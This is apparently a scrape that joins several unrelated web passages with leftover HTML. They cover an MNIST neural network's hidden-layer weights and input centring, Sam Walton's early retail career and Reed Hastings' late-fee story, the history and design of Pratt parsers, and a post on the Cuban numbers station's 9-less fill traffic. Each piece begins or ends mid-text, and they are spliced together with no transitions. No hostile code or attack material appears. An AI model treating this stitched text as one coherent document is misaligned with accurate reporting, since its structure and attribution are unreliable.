        see if we can find out whats happening!

        On the next video, you can follow trough the learning process epoch by epoch.
        
        In the Hidden layer section you can see the 64 neurons of the Hidden layer in a 8x8 arrangement.
        Each neuron is a 28x28 grid, showing red pixels for positive weights, and blue pixels for negative weights
        as they connect to the Input layer (that is essentially the input image). 
        The bias (or negative threshold) is also visible as a vertical bar on the right side of the weights.
        Yellow is for positive biases and green is for negative ones.
        The Output layer consists of 10 neurons, each having 8x8 weights connecting to each of the neurons in
        the Hidden layer.

    <p>
        As the network is learning you can see some curly patterns emerging from the initial random noise. Those patterns are the common
        parts of numeric digits that the network generalized to. Looking at this image, it seems like each neuron in the Hidden layer is sort of like a function
        in a programming language, meaning that a following layer (in this case the Output layer) can use the Hidden
        layer's neurons as if they were functions implementing some abstracted behavior. By adjusting a weight in one of
        the the Output layer's neurons, it can selectively discard or use the result of the corresponding 'function' in the Hidden layer.
        This is a very powerful way to process things. Imagine having a programming language, where you are not allowed to use any functions:
        you would have to copy-paste a lot of code around meaning that you'd use up a lot more space due to the more instructions.
        Using multiple layers in a network therefore allows us to use way less total neurons to achieve similiar results.
    </p>
    
    <p>
        The patterns that have emerged in the Hidden layer are quite interesting. As we discussed they are probably some
        generalization of hand-drawn numbers, an efficient, compact way of differentiating from one digit to an other.
        Looking at them closely reveals some interesting property though: they seem to be noticably centered inside 
        the 28x28 pixel sized region. Could this mean that the MNIST data was somehow pre-processed? 
        The MNIST dataset's description reveals that in fact this is the case:
    </p>

    <div>
        <p>
            ❞
        </p>
        <p>
            The images were centered in a 28x28 image by computing the center of mass of the pixels, and translating the image so as to position this point at the center of the 28x28 field.
        </p>
    </div>

    <p>
        That's the issue! The previous drawing applet didn't actually take that into consideration, and as the network only ever encountered
        images that were previously centered, it only learned to recognize those.
        The solution now seems simple: Calculate the center of mass for the image that is drawn, and translate the image so that it is in 
        the middle of the 28x28 region.
        This fixes the issue entirely, providing a network that can actually recognize digits. Try out the fixed version here:
    </p>

    <div>
        <canvas id="drawCanvasCorrectedSmall" width="28" height="28"> Your browser does not support the HTML5 canvas tag.</canvas>
        <canvas id="drawCanvasCorrected" width="300" height="300"> Your browser does not support the HTML5 canvas tag.</canvas>
        
        <p id="lblResultCorrected">Draw a number from 0 to 9!</p>
        
    </div>

    <p>
        We could also randomly translate the input images and train the network on that, but that is an unnecessarily harder
        problem for a network to solve. A conventional algorithm is perfectly suitable for this task. 
        Additionally the translation might not be enough, for even better results we should fit the size of the drawing
        to the 28x28 pixel grid.
    </p>
    
    <p>
        One other interesting insight that we can gain from this visualization, is that the 64 neurons of the Hidden layer are
        in fact more than what the network needs. Pause the video at the end of the learning process, and you'll see that out of
        the 64 neurons in the Hidden layer, around 12 of them are noticably dimmer than the rest. It seems like that 
        these neurons have very little impact on the final result, and their values are not that important.
        If you focus on the top-left neuron on the 8x8 grid, you can see that not only it is very dim, but also 
        none the Output layer's 10 neurons reference that top-left neuron with a high enough weight to matter, meaning that it is a 
        mostly redundant. This is a direct hint that we could reduce the neuron count in the Hidden layer to speed up
        learning.
    </p>

Take the image above of Reed Hastings @ Netflix....</p><p>Reed Hastings has <a href="https://www.vanityfair.com/news/2013/02/07-reed-hastings">said</a> <a href="http://archive.fortune.com/2009/01/27/news/newsmakers/hastings_netflix.fortune/index.html">many</a> <a href="https://twitter.com/netflix/status/2746816142?lang=en">times</a> <a href="https://www.wired.com/2002/12/netflix-6/">that</a> <a href="http://www.evancarmichael.com/library/reed-hastings/Reed-Hastings-Quotes.html">he got the</a> <a href="https://www.hollywoodreporter.com/news/reed-hastings-innovator-year-81514">idea</a> for Netflix because he once was charged a $40 late fee on Apollo 13.</p><p>That didn’t actually happen. </p><p>It’s unfortunate because it will inevitably mislead anyone learning how to start a company. </p><h3>Sam Walton's Overnight Success</h3><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e70c3fecf07561da8e7_grand_opening.jpeg" alt=""></p></figure><p>Sam was already 44(!) when he opened the first Walmart and had been running his own retail stores for over 15 years.</p><p>He wondered why people focused on the beginning of Walmart: </p><p><strong>Somehow over the years folks have gotten the impression that Walmart was something I dreamed up out of the blue as a middle-aged man, and that it was just this great idea that turned into an overnight success… </strong></p><p><strong>Like most overnight successes, it was about 20 years in the making.</strong></p><p>If you’re trying to build your own thing &amp; you want to learn from “the founder of Walmart”, looking at the start of the company itself is stupid because at that point he already had 15 years of experience</p><p>So let’s start with Sam’s very first store.</p><h3>The Biggest Mistake of&nbsp;Sam's Professional Life</h3><p>Sam started his retail career at 27 buying his 1st store, a “Ben Franklin” variety store franchise. </p><p>As a beginner he relied on the franchise’s playbook but also incorporated his own experiments. </p><p>Things like:</p><ul role="list"><li>putting popcorn &amp; ice cream machines in front of the store to drive traffic</li><li>doing huge discounts but actually making it up in volume (i.e. not ironically)</li><li>buying directly from manufactures instead of going through the franchise (which allowed for cheaper prices)</li></ul><p>He worked hard on that single store for 5 years, grew sales 3.5x to $250k/year and became the #1 Ben Franklin franchisee in his six-state region.</p><p>But then he found out he’d made a gigantic mistake.</p><p><strong><em>When he signed the store lease he didn’t include an option to renew it.</em></strong></p><p>The owner (a local department store competitor) saw his success &amp; refused to renew the lease at any price, thereby forcing Sam to shut down the store.</p><p>Imagine working on something for 5 years straight, becoming the best at it, and then having a single person end it all.</p><p>Sam was devastated:</p><p><strong><em>It was the lowpoint of my business life. I felt sick to my stomach. I couldn’t believe it was happening to me… I had built the best variety store in the whole region and worked hard in the community – done everything right – and now I was being kicked out of town. It didn’t seem fair. I blamed myself for ever getting suckered into such an awful lease, and I was furious at the landlord.</em></strong></p><p>He was mad, but he accepted responsibility:</p><p><strong><em>I’ve always thought of problems as challenges, and this one wasn’t any different… I had to pick myself up and get on with it, do it all over again, only even better this time.</em></strong></p><p>If Facebook or Google change their algorithms you at least get to keep your old customer base and your business assets.</p><p>But with a retail store you have none of that. </p><p>And because of the structure of the town they couldn’t just open another store somewhere nearby.</p><p>The Waltons literally had to pack up their family of 6 and go find a new town.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7090bddf371b5d9227_shadow_figures.jpeg" alt=""></p></figure><p>If he’d wanted to Sam had plenty of reasons to sulk: they were starting all over in a <em>smaller</em> town (Bentonville) that also had its fair share of competition (3 other variety stores). </p><p><strong>But Sam said “it didn’t matter much because I had big plans.”</strong></p><h3>Unsexy Determination</h3><p>Sam spent the next 12 years in what I call <em>narrative limbo</em>.</p><p>It’s the crucial part of any “overnight success” that doesn’t get covered in the Successful Entrepreneur genre.</p><p>No one writes about all the random tangents and mistakes you make here.</p><p>Like, say, that time Sam tried to start a shopping mall 10 years too early and lost $25,000? </p><p>Or what about the time a tornado destroyed his best performing store? All he had to say was “we just rebuilt it and got back at it.”</p><p>This is important to know if you’re trying to learn from Sam, but it doesn’t fit into any narrative.</p><p>The lesson here is that there will be mistakes and problems on any path to success. As a recent book title says, <a href="https://www.amazon.com/dp/B00G3L1B8K/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1">those obstacles are the way itself.</a></p><p>A coworker said Sam excelled here because he woke up every day “determined to improve something”, and that he was</p><p><strong><em>less afraid of being wrong than anyone I’ve ever known…Once he sees he’s wrong, he just shakes it off and heads in another direction.</em></strong></p><p>You don’t get any of this from Reed Hastings when he talks about $40 late fees. You think “oh I need a great idea” when the reality is the idea is nothing and your psychology &amp; persistence is everything.</p><p>Eventually Sam got to 15 stores &amp; by 1960 was the largest independent variety store operator in the US, doing a a total of ~$12M (in 2018 dollars) in annual revenue.</p><h3>It Would Seem Obvious</h3><p>It was here that Sam finally saw the opportunity for much bigger discount stores and got to work on the 1st Walmart.</p><p>He was the most successful independent operator in the US &amp; had 15 years of experience in retail, surely it should have been easy for him to raise money from investors…?</p><p>Wrong.</p><p>Sam asked other store owners, entrepreneurs, competitors… basically everyone said no.</p><p>He got a measly 5% from his own brother &amp; a store manager and had to borrow the other 95% (signing their house and all their other stores as collateral).</p><p><strong><em>Even the great Sam Walton couldn’t find investors to start the 1st Walmart, on the back of a near-perfect record in retail.</em></strong></p><h3>The 1st Wal-Mart</h3><p>Finally, the point where most people look at to learn, is the end of our story.</p><p>The 1st Walmart was an ugly retail store (8-foot ceilings, concrete floor, wooden fixtures) but it worked because Walmart’s prices always beat competitors. </p><p>(Even the name “Walmart” was selected with customer prices in mind: it was cheaper to buy neon signs for 7 letters than the longer names Sam considered.)</p><p>And you think Sam cared 2 cents about what anyone else thought about his stores? </p><p>The New York Times doesn’t mention Sam or Walmart until 1969, 7 years after the 1st store opening, and he’s just one random quote in the back of the paper:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7098a06f34c1f02247_south.png" alt=""></p></figure><p>And the Walmart 1970 IPO got a <em>single</em> mention on page 44 of the Times:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7072644e0be8fffc12_nyt_walton.png" alt=""></p></figure><p>If you want to learn from entrepreneurs, look at the start not the finish.</p><p>This first appeared in my weekly newsletter <em>How It Actually Works</em>. <a href="https://www.howitactuallyworks.com/">Sign up to receive it here.</a></p></div></div>]]>

                    <h2 id="a-brief-history-of-the-pratt-parsing-algorithm">A brief history of the Pratt parsing algorithm</h2>
<p>The history of programming language parsers is dominated by the thorny challenge of parsing expressions, mathematical expressions in particular, taking into account the pecedence of operators in the expressions. Modern formal language theory began with the work of Noam Chomsky in the 1950s, in which Chomsky lays out a mathematical framework for linguistics. Under this mathematical framework, languages exist within a heirarchy of langauges defined according to how difficult the language is to parse.<sup id="fnref:1"><a href="#fn:1">1</a></sup> But computer programmers needed practical, efficient algorithms to parse computer programs for translation to machine code. Parsers of the 1950s relied on ad hoc logic rather than systematic algorithms (a feature which persists to this day, though to a much lesser degree). The 1960s was a golden age of parsing algorithm research when nearly all of the concepts and algorithms we use today were discovered and rigorously studied. By the early 1970s, parsing theory had evolved to the point that  Stephen C. Johnson, a computer scientist at Bell Labs / AT&amp;T, was able to start work on YACC (now “Yacc”), “Yet Another Compiler Compiler.”<sup id="fnref:2"><a href="#fn:2">2</a></sup> YACC was first publically described in 1975 and shipped with Unix version 3<sup id="fnref:3"><a href="#fn:3">3</a></sup>  and is still in use today.</p>

<p>The thorny challenge of parsing expressions was partially solved in 1961 by the venerable shunting-yard algorithm described by Dutch computer scientist Edsger W. Dijkstra, which algorithm could efficiently parse binary infix operator expressions with a value stack and an operator stack, creating nodes from the bottom up. Vaughan R. Pratt generalized Dijkstra’s sunting-yard algorithm to parsing of entire languages, this time using a single stack, or using recursive descent with the call stack as an implicit stack, creating nodes from the top down. Pratt’s parsing algorithm overcomes a number of limitations with the shunting-yard algorithm and is simpler.</p>

<p>Precedence climbing was apparently first invented by Martin Richards in 1979<sup id="fnref:4"><a href="#fn:4">4</a></sup> for his BCPL compiler. Precedence climbing uses a single recursive function and a single table mapping token IDs to their precedence instead of Pratt’s mutual recursive descent and multiple tables. In fact, precedence climbing can be seen as a special case of Pratt parsing, though historically they have been understood as related but not identical.<sup id="fnref:5"><a href="#fn:5">5</a></sup><sup>,</sup><sup id="fnref:6"><a href="#fn:6">6</a></sup></p>

<p>Vaughan Pratt had described his algorithm six years earlier in 1973 at the very first meeting of POPL, the Symposium on Principles of Programming Languages, which remains among the most important conferences in the field. It is interesting to see what other papers are published in the 1973 POPL Proceedings. One finds, for example, Aho, S. C. Johnson, and J. D. Ullman’s “Deterministic parsing of ambiguous grammars,“<sup id="fnref:8"><a href="#fn:8">7</a></sup> and James H. Morris, Jr.’s “Types are not sets,”<sup id="fnref:9"><a href="#fn:9">8</a></sup> among papers by several other influential luminaries. Vaughan Pratt had been developing an alternative expression syntax for MACLISP called CGOL,<sup id="fnref:10"><a href="#fn:10">9</a></sup> which he needed to parse.</p>

<h2 id="parser-design">Parser design</h2>

<h3 id="the-typical-design">The typical design</h3>

<p>There are already many articles on the web describing the Pratt parsing algorithm. (I recommend <sup id="fnref:5:1"><a href="#fn:5">5</a></sup>.) If you are not familiar with the algorithm, go read up on it before returning here.</p>

<p>A typical object oriented design is to have a node class for each kind of AST node, each class implementing their own “parselet” method, traditionally named <code>led</code>  for “left donation” after Pratt’s original article, that is called by a driver algorithm and is responsible for parsing the node instance’s operands (children) by calling back into the driver before returning. Each class also keeps track of its associativity and precedence. The driver algorithm consumes a token, looks up the appropriate class in a table, creates an instance and calls its parslet method.</p>

<p>We can be a little bit more efficient by having only a handful of superclasses corresponding to each required (affix, associativity) combination. In the typical object-oriented Pratt-parser design, every operator would need a subclass of the form</p>

<div><div><pre><code><span>class</span> <span>Multiply</span><span>:</span> <span>public</span> <span>InfixLeftAssoc</span><span>{</span>
  <span>Multiply</span><span>(</span><span>Parser</span> <span>parser</span><span>,</span> <span>ASTNode</span> <span>left</span><span>,</span> <span>Token</span> <span>operator</span><span>)</span><span>:</span> 
  	<span>precedence</span><span>(</span><span>40</span><span>){</span>
		<span>super</span><span>(</span><span>parser</span><span>,</span> <span>left</span><span>,</span> <span>operator</span><span>);</span>
  <span>}</span>
  
  <span>T</span> <span>MultiplyMethodA</span><span>(</span><span>U</span> <span>param1</span><span>,</span> <span>V</span> <span>param2</span><span>){...}</span>
  <span>W</span> <span>MultiplyMethodB</span><span>(</span><span>X</span> <span>param1</span><span>,</span> <span>Y</span> <span>param2</span><span>){...}</span>
  <span>// etc.
</span><span>}</span>
</code></pre></div></div>

<p>This class establishes the Multiply operator as an infix, left associative operator. We have also initialized our operator precedence to 40. Again, the <code>InfixLeftAssoc</code> superclass and other ancestor classes compute left and right binding power (LBP and RBP) from the value of precedence and associativity and implement the <code>led</code> method (“left donation” parselette method) and any utility methods and members. This concrete subclass serves the following purposes:</p>

<ol>
  <li>encodes the affix (by specifying its superclass)</li>
  <li>encodes the associativity  (by specifying its superclass)</li>
  <li>records the precedence</li>
  <li>provides a home for <code>MultiplyMethodA</code> and <code>MultiplyMethodB</code></li>
</ol>

<p>But why are we using different classes at all? This OOP design has several flaws:</p>

<ul>
  <li>It violates the principle of separation of concerns: Why are AST nodes doing the work of the parser?</li>
  <li>It violates the DRY Principle: Unless you autogenerate the code, you need to write a class for every operator—even if you relegate the parslet code to a handful of superclasses.</li>
  <li>This parser design is littered with static data: operator tokens, constants for precedence, associativity, affix, and token IDs, all of which is redundant, as it exists in a table used by the driver algorithm anyway. (Ironically, it is precisely because of its object-oriented design that the code and the data it acts upon are so disparate. This is not entirely the fault of OOP per se but rather of a poor choice of what concepts should be materialized as objects.)</li>
  <li>Generalizing the previous point: This design fixes the language at compile time. If you want to change the precedence of an operator, you need to rewrite, recompile, and redeploy the parser.</li>
  <li>It is cumbersome to write an operator table statically: Unless the code is automatically generated, writing “<code>parser.registeroperator(op, prec, assoc, whatever)</code>,” the code that line depends on, and every subclass for every single operator is a bummer. Even if you autogenerate code, you have to write a code generator.</li>
</ul>

<p>❝The temptation to write a code generator is often a sign that a more flexible design exists, a design that exploits whatever regularity exists in the code that makes programmatically generating the code possible in the first place.❞</p>

<p>The temptation to write a code generator is often a sign that a more flexible design exists, a design that exploits whatever regularity exists in the code that makes programmatically generating the code possible in the first place. <em>In principle</em>, if code can automatically be generated, it can also be automatically compiled and executed. So maybe the (hypothetical) generate-compile-run pipeline (usually called a JIT or jitter) can be refactored to eliminate the compile step. In our case, instead of writing a bespoke Pratt parser in which the operator table is both encoded in the class hierarchy and generated again at runtime, why not write a generic Pratt parser that reads in the operator database at startup? As a bonus, modifying the language does not require a recompile: You can add, remove, or modify operators at <em>runtime</em> if you’d like, and maintaining the expression grammar is as simple as editing a value in a spreadsheet. (Indeed, it could be literally that!)</p>

<p>The <code>TokenID</code> might be supplied by the lexer/scanner (many Pratt parsers are scanner-less) and will be used as the identifier. <code>Operator</code> and <code>NameString</code> are only used for printing output. The remaining columns are required to compute the left and right binding powers of each operator. In this example language, every operator is either a terminal (number) or a binary infix operator.</p>

<p>In this design, the database includes which tokens of the operator can take a left operand (<code>LToken</code>), can begin an expression (no left operand, <code>NToken</code>), or are included in some other position (<code>OToken</code>).</p>

<blockquote>
  <p>The <code>LToken</code>, <code>NToken</code>, <code>OToken</code>, <code>Affix</code>, and <code>Arity</code> can all be inferred from a single example usage, for example:
<code>op1 ? op2 : op3</code>
This suggests that there may be a way to generate a parser for an expression language using nothing but examples. Indeed, there is!</p>
</blockquote>

<p>To reiterate the point, this table of operators might live in a plaintext CSV file. At startup—not at compile time—the Pratt parser reads in the operator table. AST nodes know their identity by their <code>TokenID</code> (which is really an operator ID) or string representation and perform identity-specific actions via dynamic dispatch.</p>

<p>That last sentence should have raised your suspicion. A fundamental benefit of this design, I claim, is that it keeps you from having to write boilerplate for every operator. Are we just shifting the boilerplate from the …</p></div></section></article></div></div></div>

		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenćion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able …</p></div></div></div>
